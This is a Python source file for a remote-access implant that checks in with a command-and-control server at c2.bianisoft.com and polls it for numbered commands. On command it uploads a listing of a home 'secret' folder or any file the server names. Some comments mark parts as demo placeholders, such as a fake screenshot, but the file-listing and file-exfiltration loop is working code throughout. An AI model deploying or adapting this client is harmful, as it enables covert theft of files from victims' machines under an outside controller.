import socket
import requests
import time
import os

from pathlib import Path
from datetime import datetime


def searchFiles(folder='/'):
    allFiles= []

    for r, d, f in os.walk(folder):
        r2 = r + "/"
        for file in f:
            allFiles.append(f"{r2 + file}\n")

    return "\n".join(allFiles)


def get_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # doesn't even have to be reachable
        s.connect(('10.255.255.255', 1))
        IP = s.getsockname()[0]
    except Exception:
        IP = '127.0.0.1'
    finally:
        s.close()
    return IP


def main():

    strMyIP = get_ip()
    print("This is my IP :" + strMyIP)

    s = requests.Session()
    r = s.put('http://c2.bianisoft.com:8081/', params={'userID': strMyIP, 'commandID' : strMyIP,})

    while True:
        now = datetime.now()
        current_time = now.strftime("%y%m%d%H%M%S")

        #Get the next command
        s = requests.Session()
        r = s.get('http://c2.bianisoft.com:8081/', params = {'userID': strMyIP})

        if r.status_code != 200:
            #Server is offline
            break

        if r.text[0] == '0':
            #Sleep for 1 minute
            time.sleep(5)

        elif r.text[0] == '1':
            # Send me your listing
            home = str(Path.home())
            listing = searchFiles(home + "/secret")    #hardcoded for demo purposes
            with open(os.getcwd() + "/listing-{}.txt".format(current_time), "w") as f:
                f.write(listing)

            files = {'file': open(os.getcwd() + "/listing-{}.txt".format(current_time), 'rb')}
            r = requests.post('http://c2.bianisoft.com:8081/',
                              files=files,
                              params = {'userID': strMyIP,
                                        'commandID' : '1',
                                        'time' : current_time})

        elif r.text[0] == '2':
            #send me a specific file
            strFile = r.text[2:]    #the command file shall countain the filename require following command #2

            #Some cleanup
            strFile= strFile.replace("\\n", "")
            strFile= strFile.replace("\n", "")

            files = {'file': open(strFile, 'rb')}
            r = requests.post('http://c2.bianisoft.com:8081/',
                              files=files,
                              params = {'userID': strMyIP,
                                        'commandID' : '2',
                                        'time' : current_time})

        elif r.text[0] == '3':
            #Take a screenshot and send the file
                #TODO, for now we use a fakeimage.png
            #send the file
            files = {'file': open(os.getcwd() + "/fakeScreenshot.png", 'rb')}
            r = requests.post('http://c2.bianisoft.com:8081/',
                              files=files,
                              params = {'userID': strMyIP,
                                        'commandID' : '3',
                                        'time' : current_time})



        elif r.text[0] == '9':
            # desinstall yourself
            break

        else:
            #default operation Sleep for 1 minute
            time.sleep(5)


if __name__ == "__main__":
    main()
